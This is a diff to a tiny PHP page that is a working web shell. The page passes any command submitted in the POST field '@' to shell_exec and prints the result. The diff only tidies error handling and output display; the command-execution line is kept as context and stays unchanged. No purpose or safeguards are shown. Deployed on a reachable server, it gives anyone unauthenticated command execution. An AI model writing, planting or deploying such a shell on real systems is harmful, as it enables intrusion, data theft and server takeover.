@@ -1,4 +1,4 @@
-<?php error_reporting(0);
+<?php
 $o = ($c = @$_POST['@']) ? shell_exec($c) : ''
 ?>
 <html>
@@ -32,12 +32,6 @@ $o = ($c = @$_POST['@']) ? shell_exec($c) : ''
   }
 </style>
 <form method="post">
-  <input autofocus name="@" value="<?= htmlspecialchars($c, ENT_QUOTES, 'utf-8') ?>" required>
+  <input autofocus name="@" value="<?= htmlspecialchars($c?:'', ENT_QUOTES, 'utf-8') ?>" required>
 </form>
-<?php if ($o): ?>
-  <pre contenteditable><?= htmlspecialchars($o, ENT_QUOTES, 'utf-8') ?></pre>
-<?php elseif ($_SERVER['REQUEST_METHOD'] == 'POST'): ?>
-  <pre>empty</pre>
-<?php endif ?>
-</body>
-</html>
+<pre contenteditable><?= htmlspecialchars($o?:'', ENT_QUOTES, 'utf-8') ?></pre>
